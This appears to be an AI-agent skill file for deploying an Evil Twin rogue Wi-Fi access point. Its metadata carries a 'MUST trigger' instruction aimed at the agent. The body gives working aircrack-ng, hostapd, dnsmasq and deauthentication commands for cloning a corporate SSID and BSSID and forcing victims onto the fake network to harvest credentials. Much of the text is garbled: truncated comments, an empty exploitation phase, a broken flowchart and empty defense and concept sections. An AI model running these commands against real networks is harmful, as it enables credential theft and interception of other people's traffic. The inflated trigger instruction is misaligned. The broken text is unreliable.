---
name: rogue-access-point-evil-twin
description: >
  [CRITICAL: MUST trigger this skill whenever related vulnerability testing is discussed.]
  Deploy an Evil Twin (Rogue Access Point) to clone a legitimate Wi-Fi network's SSID and MAC 
  address. By combining this with targeted deauthentication attacks, an attacker aggressively 
  forces nearby victims to silently connect to the malicious AP, enabling pervasive Man-in-the-Middle 
  (MitM), captive portal phishing, and credentials interception.
domain: cybersecurity
subdomain: penetration-testing
category: Wireless
difficulty: intermediate
estimated_time: "2-3 hours"
mitre_attack:
  tactics: [TA0006, TA0009]
  techniques: [T1659, T1111]
platforms: [hardware, network]
tags: [wireless, evil-twin, rogue-ap, wpa2, penetration-testing, deauth, phishing]
tools: [aircrack-ng, hostapd, dnsmasq, wifiphisher]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# Rogue Access Point (Evil Twin)

## When to Use
- When conducting physical Red Team operations or precise Wireless Penetration Tests to validate if corporate employees will connect to untrusted networks (e.g., verifying Guest network isolation or testing Security Awareness).
- To aggressively intercept wireless network traffic when standard passive sniffing (monitor mode) yields only encrypted WPA2/WPA3 packets, which require offline cracking.
- To harvest corporate credentials directly from users via sophisticated Captive Portal phishing campaigns mimicking the target organization's authentic login page.

## Workflow

### Phase 1: Reconnaissance (The Setup)

```bash
# Concept: To clone a network 1. Start Interface airmon-ng start wlan1

# 2. Sniff airodump-ng wlan1mon

# Target BSSID: 00:11:22:33:44:55
# Target SSID: "Corporate_Private"
# Target Channel: 6
```

### Phase 2: Building the Evil Twin

```bash
# Concept: We must 1. Configure Hostapd # cat <<EOF > hostapd.conf
interface=wlan1mon
ssid=Corporate_Private
bssid=00:11:22:33:44:55
hw_mode=g
channel=6
EOF

# 2. Configure # cat <<EOF > dnsmasq.conf
interface=wlan1mon
dhcp-range=192.168.1.10,192.168.1.100,8h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
EOF

# 3. Start hostapd hostapd.conf &
dnsmasq -C dnsmasq.conf -d &
```

### Phase 3: The Forced Migration (Deauthentication)

```bash
# Send aireplay-ng --deauth 100 -a 00:11:22:33:44:55 -c [VICTIM_MAC] wlan2mon
```

### Phase 4: Exploitation (Captive Portal / MitM)

```bash
# ```

#### Decision Point 🔀
```mermaid
flowchart TD
    A[Setup ] --> B[Host ]
    B --> C{Does ]}
    C -->|Yes| D[Capture ]
    C -->|No| E[Increase ]
    D --> F[Maintain ]
```

## 🔵 Blue Team Detection & Defense
- **Wireless Intrusion Prevention System (WIPS)**: **802.1X / Enterprise Security**: **Client-Side Awareness**: Key Concepts
| Concept | Description |
|---------|-------------|
| Deauthentication | |
| Captive Portal | |

## References
- Wifiphisher: [The Rogue Access Point Framework](https://github.com/wifiphisher/wifiphisher)
- Aircrack-ng documentation: [Aireplay-ng Deauthentication](https://www.aircrack-ng.org/doku.php?id=deauthentication)
- DEF CON 25: [Advanced WiFi Attacks](https://www.youtube.com/watch?v=kYJjRk67bF8)
